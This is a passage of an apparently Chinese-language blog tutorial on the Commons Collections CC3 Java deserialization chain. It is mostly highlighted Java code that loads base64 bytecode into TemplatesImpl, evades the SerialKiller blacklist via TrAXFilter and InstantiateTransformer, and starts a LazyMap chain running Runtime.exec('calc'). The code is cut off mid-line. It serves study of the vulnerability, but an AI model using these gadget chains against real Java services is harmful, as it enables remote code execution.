class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">CommonsCollectionsIntro2</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> fieldName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token class-name\">Field</span> field <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span>fieldName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> field<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> field<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token comment\">// source: bytecodes/HelloTemplateImpl.java</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> code <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>\"yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQ</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token class-name\">EACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRj</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token class-name\">L0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYW</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>xpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25z</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token class-name\">BwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb2</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token number\">0</span>vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9z</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZG</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>xlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwu</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>amF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token class-name\">RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMv</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>cnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludG</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token class-name\">VybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEA</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token class-name\">FUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQ</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token class-name\">AVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAA</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token class-name\">AbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQ</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token class-name\">AKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAE</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE<span class=\"token operator\">=</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre> <span class=\"token class-name\">TemplatesImpl</span> obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TemplatesImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_bytecodes\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"HelloTemplatesImpl\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre> <span class=\"token function\">setFieldValue</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">,</span> <span class=\"token string\">\"_tfactory\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransformerFactoryImpl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"newTransformer\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre> <span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre> <span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre> <span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre> outerMap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"xxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>成功执行字节码：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102127585.png\" alt=\"image-20250410212747326\" /></p>\n<p>现在是 cc3 链的一半了，但是你看 cc3 的 yso 没有用 InvokerTransformer 这个玩意，这是因为：</p>\n<p>2015 年初，@frohoff 和 @gebl 发布了 Talk《Marshalling Pickles: how deserializing objects will ruin</p>\n<p>your day》，以及 Java 反序列化利⽤⼯具 ysoserial，随后引爆了安全界。开发者们⾃然会去找寻⼀种安</p>\n<p>全的过滤⽅法，于是类似 SerialKiller 这样的⼯具随之诞⽣。</p>\n<p>SerialKiller 是⼀个 Java 反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的</p>\n<p>类。在其发布的第⼀个版本代码中，我们可以看到其给出了最初的⿊名单</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102145768.png\" alt=\"image-20250410214517565\" /></p>\n<p>这个黑名单 InvokerTransformer 赫然在列，也就切断了 cc1 的利用链，为了绕过这个限制，yso 的 cc3 使用到了另一个类：com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter。</p>\n<p>这个类的构造方法中调通了（TransfoemerImpl） templates.newTransformer (), 免去了我们使用 InvokerTransformer 手工调用 newTransformer () 方法这一步：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102150848.png\" alt=\"image-20250410215018669\" /></p>\n<p>在_transformer=(TransfoemerImpl) templates.newTransformer (); 这里</p>\n<p>当然，缺少了 Invokerformer，TrAXFileter 的构造方法也是无法调用的。这里会用到一个新的 Tranformer，就是 org.apache.commonscollections.functors.InstantiateTransformer.</p>\n<p>instantiateTransformer 也是一个实现了 Transformer 接口的类，他的作用就是调用构造方法。</p>\n<p>所以，我们需要实现的目标就是，利用 InstantiateTransformer 来调用到 TrAXFilter 的构造方法，再利用其构造方法里的 templates.newTransfoemer () 调用到 TemplatesImpl 里的字节码</p>\n<p>我们构造的 Transformer 调用链如下：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TrAXFilter</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InstantiateTransformer</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">Templates</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> obj <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>替换到前面的 demo 中，也能成功触发，皮面了使用 InvokerTranformer:</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202504102200980.png\" alt=\"image-20250410220035682\" /></p>\n<p>替换之后也是能够触发字节码的</p>\n<p>这标记的里面的这些，一个是 ConstantTransformer 返回一个 TrAXFilter 的类，instantiate 新建类时会调用这个类的构造方法，刚好 TrAXFilter 的构造方法里面有一个 templates.newTransformer () 调用到 TemplatesImpl 里的字节码</p>\n<p>最后就是完整版的 payload：跟 acc1 链好像和不了一点，因为这里有一个 base64 类直在 1.8 以上版本存在，但是这个版本的 acc1 链需要 1.7 及一下才会触发，所以这个版本触发不了（其他的 base64 好像街解不了码，会直接报错），我用的是 acc6 里面的 LazyMap：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">myapp</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//Java 8</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Transformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ChainedTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ConstantTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>functors<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvokerTransformer</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>commons<span class=\"token punctuation\">.</span>collections<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">LazyMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteArrayOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Retention</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Constructor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">InvocationHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Proxy</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Map</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> acc_LazyMap <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                        <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token string\">\"calc\"</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">new</span> <span class=\"token class-name\">ConstantTransformer</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token class-name\">Transformer</span> transformerChain <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token class-name\">Map</span> innerMap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token class-name\">Map</span> outerMap <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>innerMap<span class=\"token punctuation\">,</span> transformerChain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token class-name\">Class</span> clazz <span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token class-name\">Constructor</span> construct <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        construct<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token class-name\">InvocationHandler</span> handler <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InvocationHandler</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                construct<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Retention</span><span class=\"token 